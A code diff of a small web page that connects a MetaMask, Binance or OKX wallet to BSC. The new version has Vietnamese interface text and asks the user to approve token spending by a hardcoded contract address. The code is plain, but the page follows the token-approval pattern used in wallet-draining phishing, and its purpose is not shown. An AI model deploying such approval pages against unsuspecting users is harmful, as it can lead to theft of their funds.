@@ -1,167 +1,121 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MetaMask BSC Token Approval</title>
+  <meta charset="UTF-8">
+  <title>Multi Wallet Approval</title>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 40px;
-      text-align: center;
-    }
-    #container {
-      background: white;
-      border-radius: 10px;
-      padding: 30px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    input, button {
-      padding: 10px;
-      font-size: 16px;
-      margin: 10px 0;
+    body { font-family: Arial; padding: 30px; text-align: center; background: #f8f8f8; }
+    #app { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input, button, select {
       width: 90%;
-      max-width: 400px;
+      padding: 10px;
+      margin: 10px;
+      font-size: 16px;
       border-radius: 5px;
       border: 1px solid #ccc;
     }
-    button {
-      background: #4CAF50;
-      color: white;
-      cursor: pointer;
-      border: none;
-    }
-    button:disabled {
-      background: #999;
-      cursor: not-allowed;
-    }
-    #status {
-      margin-bottom: 20px;
-      font-weight: bold;
-    }
+    button { background: #4CAF50; color: white; border: none; cursor: pointer; }
+    button:disabled { background: #999; cursor: not-allowed; }
   </style>
 </head>
 <body>
-  <div id="container">
-    <div id="status">Please connect to MetaMask</div>
-    <button id="connectButton">Connect to MetaMask</button>
-    <br>
-    <input type="text" id="tokenAddress" placeholder="Enter token address to approve">
-    <input type="text" id="amount" placeholder="Enter amount to approve">
-    <button id="approveButton" disabled>Approve</button>
+  <div id="app">
+    <div id="status">Vui lòng chọn ví để kết nối</div>
+    <select id="walletSelect">
+      <option value="">-- Chọn ví --</option>
+      <option value="metamask">MetaMask</option>
+      <option value="binance">Binance Wallet</option>
+      <option value="okx">OKX Wallet</option>
+    </select>
+    <button id="connectBtn">Kết nối ví</button>
+
+    <input type="text" id="tokenAddress" placeholder="Token address cần approve">
+    <input type="text" id="amount" placeholder="Số lượng muốn approve">
+    <button id="approveBtn" disabled>Approve</button>
   </div>
 
   <script>
     const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
     let signer;
 
-    async function connect() {
-      if (typeof window.ethereum === 'undefined') {
-        document.getElementById('status').innerText = 'MetaMask is not installed!';
+    async function connectWallet() {
+      const selectedWallet = document.getElementById("walletSelect").value;
+      let provider;
+
+      if (selectedWallet === "metamask") {
+        provider = window.ethereum;
+      } else if (selectedWallet === "binance") {
+        provider = window.BinanceChain;
+      } else if (selectedWallet === "okx") {
+        provider = window.okxwallet;
+      }
+
+      if (!provider) {
+        document.getElementById("status").innerText = "Ví không được phát hiện!";
         return;
       }
 
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        if (accounts.length === 0) throw new Error('No accounts found');
-        
-        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainIdHex !== '0x38') {
+        await provider.request({ method: 'eth_requestAccounts' });
+
+        // Kiểm tra và chuyển mạng nếu cần
+        const chainId = await provider.request({ method: 'eth_chainId' });
+        if (chainId !== '0x38') { // BSC
           try {
-            await window.ethereum.request({
+            await provider.request({
               method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }],
+              params: [{ chainId: '0x38' }]
             });
-          } catch (switchError) {
-            if (switchError.code === 4902) {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: '0x38',
-                  chainName: 'Binance Smart Chain',
-                  nativeCurrency: {
-                    name: 'BNB',
-                    symbol: 'BNB',
-                    decimals: 18,
-                  },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com'],
-                }],
-              });
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-              });
-            } else {
-              throw switchError;
-            }
+          } catch (e) {
+            document.getElementById("status").innerText = "Chuyển mạng BSC thất bại!";
+            return;
           }
         }
 
-        const network = { chainId: 56, ensAddress: null };
-        const provider = new ethers.providers.Web3Provider(window.ethereum, network);
-        signer = provider.getSigner();
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        signer = ethersProvider.getSigner();
         const address = await signer.getAddress();
+        document.getElementById("status").innerText = "Kết nối thành công: " + address;
+        document.getElementById("approveBtn").disabled = false;
 
-        document.getElementById('status').innerText = `Connected to: ${address}`;
-        document.getElementById('approveButton').disabled = false;
-      } catch (error) {
-        document.getElementById('status').innerText = `Connection failed: ${error.message}`;
-        console.error(error);
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Lỗi khi kết nối ví: " + err.message;
       }
     }
 
-    async function approve() {
-      const tokenAddressInput = document.getElementById('tokenAddress').value.trim();
-      const amountInput = document.getElementById('amount').value.trim();
+    async function approveToken() {
+      const tokenAddress = document.getElementById("tokenAddress").value;
+      const amount = document.getElementById("amount").value;
 
-      if (!tokenAddressInput || !ethers.utils.isAddress(tokenAddressInput)) {
-        document.getElementById('status').innerText = 'Invalid token address!';
-        return;
-      }
-
-      if (!amountInput || isNaN(amountInput) || Number(amountInput) <= 0) {
-        document.getElementById('status').innerText = 'Invalid amount!';
-        return;
-      }
-
-      if (!signer) {
-        document.getElementById('status').innerText = 'Connect to MetaMask first.';
+      if (!ethers.utils.isAddress(tokenAddress)) {
+        document.getElementById("status").innerText = "Địa chỉ token không hợp lệ!";
         return;
       }
 
       try {
-        const tokenAddress = ethers.utils.getAddress(tokenAddressInput);
-        const spender = ethers.utils.getAddress(scB_address);
-
-        const tokenAbi = [
+        const contract = new ethers.Contract(tokenAddress, [
           "function approve(address spender, uint256 amount) public returns (bool)",
           "function decimals() public view returns (uint8)"
-        ];
+        ], signer);
 
-        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
-        const decimals = await tokenContract.decimals();
-        const amount = ethers.utils.parseUnits(amountInput, decimals);
+        const decimals = await contract.decimals();
+        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
+        document.getElementById("status").innerText = "Đang gửi giao dịch approve...";
 
-        document.getElementById('status').innerText = 'Approving... Please wait.';
-
-        const tx = await tokenContract.approve(spender, amount);
-        console.log('Transaction:', tx.hash);
-
+        const tx = await contract.approve(scB_address, parsedAmount);
         await tx.wait();
-        document.getElementById('status').innerText = `Approved successfully! Tx: ${tx.hash}`;
-      } catch (error) {
-        document.getElementById('status').innerText = `Approval failed: ${error.message}`;
-        console.error(error);
+        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;
+
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Lỗi khi approve: " + err.message;
       }
     }
 
-    document.getElementById('connectButton').addEventListener('click', connect);
-    document.getElementById('approveButton').addEventListener('click', approve);
+    document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    document.getElementById("approveBtn").addEventListener("click", approveToken);
   </script>
 </body>
 </html>
